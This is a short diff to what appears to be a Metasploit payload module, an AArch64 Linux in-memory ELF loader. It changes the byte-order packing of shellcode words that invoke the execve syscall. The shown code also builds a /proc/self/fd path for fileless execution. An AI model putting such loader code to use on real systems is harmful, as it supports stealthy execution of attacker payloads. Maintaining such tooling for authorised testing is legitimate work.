@@ -59,7 +59,7 @@ module Msf::Payload::Linux::Aarch64::ElfLoader
       0xa81b80d2, # 0x1090:	mov	x8, #0xdd	0xa81b80d2
       0x010000d4, # 0x1094:	svc	#0	0x010000d4
       0xe2ffff97, # 0x1098:	bl	#0x1020	0xe2ffff97,
-    ].pack('N*')
+    ].pack('V*')
     fd_path = '/proc/self/fd/'.bytes.pack('c*') + "\x00" * 16
     in_memory_loader + [payload.length].pack('V*') + fd_path
   end
